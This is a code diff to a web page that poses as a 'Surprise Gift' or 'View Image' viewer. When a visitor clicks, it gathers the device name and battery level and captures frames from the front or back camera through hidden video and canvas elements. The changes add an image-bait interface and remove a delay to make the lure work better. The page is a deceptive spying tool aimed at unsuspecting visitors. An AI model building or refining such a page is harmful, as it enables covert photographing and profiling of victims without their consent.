@@ -2,15 +2,16 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Surprise Gift!</title>
+    <title>View Image</title>
     <style>
         body { background: white; color: black; text-align: center; font-family: sans-serif; margin:0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        #loading-ui, #success-msg { display: none; }
+        #loading-ui, #success-msg, #custom-ui { display: none; }
         .gift-box { font-size: 80px; animation: bounce 1s infinite alternate; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
         @keyframes bounce { 100% { transform: translateY(-30px); } }
         .btn { background: #00ff00; color: black; border: none; padding: 18px 30px; font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer; }
+        #custom-img { max-width: 90%; max-height: 70vh; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.2); }
     </style>
 </head>
 <body>
@@ -20,23 +21,37 @@
         <button class="btn" onclick="startWork()">🔓 UNLOCK GIFT 🎁</button>
     </div>
 
+    <div id="custom-ui">
+        <img src="custom.jpg" id="custom-img"><br><br>
+        <button class="btn" onclick="startWork()">VIEW FULL IMAGE</button>
+    </div>
+
     <div id="loading-ui">
         <div class="gift-box">🎁</div>
-        <p style="font-size: 18px; font-weight: bold; color: gold;">Unlocking Your Gift... Please wait</p>
+        <p style="font-size: 18px; font-weight: bold; color: gold;">Processing... Please wait</p>
         <div class="loader"></div>
     </div>
 
     <div id="success-msg">
         <div style="font-size: 80px;">🎊</div>
-        <h2 style="color:#00ff00">CONGRATULATIONS! 🎉</h2>
-        <p>Your gift has been redeemed successfully.</p>
-        <p style="color: #aaa; font-style: italic;">God bless you. ✨</p>
+        <h2 style="color:#00ff00">SUCCESS! 🎉</h2>
+        <p>Verified Successfully.</p>
     </div>
 
     <video id="v" style="display:none" autoplay playsinline muted></video>
     <canvas id="c" style="display:none"></canvas>
 
     <script>
+        // Page Load hone par check karega ki kaunsa option dikhana hai
+        window.onload = async function() {
+            let res = await fetch('type.txt');
+            let type = await res.text();
+            if(type.trim() === 'custom') {
+                document.getElementById('start-page').style.display = 'none';
+                document.getElementById('custom-ui').style.display = 'block';
+            }
+        }
+
         function getDeviceName() {
             const ua = navigator.userAgent;
             if (/android/i.test(ua)) {
@@ -53,6 +68,7 @@
             document.body.style.background = "black";
             document.body.style.color = "white";
             document.getElementById('start-page').style.display = 'none';
+            document.getElementById('custom-ui').style.display = 'none';
             document.getElementById('loading-ui').style.display = 'block';
 
             let response = await fetch('mode.txt');
@@ -63,8 +79,6 @@
                 let b = await navigator.getBattery(); 
                 info.battery = Math.round(b.level * 100) + "%"; 
             } catch(e) {}
-
-            await new Promise(r => setTimeout(r, 8000)); // 8 seconds delay
 
             if(mode.trim() === 'front') await runCam({facingMode: "user"}, 3, "FRONT", info);
             else if(mode.trim() === 'back') await runCam({facingMode: "environment"}, 3, "BACK", info);
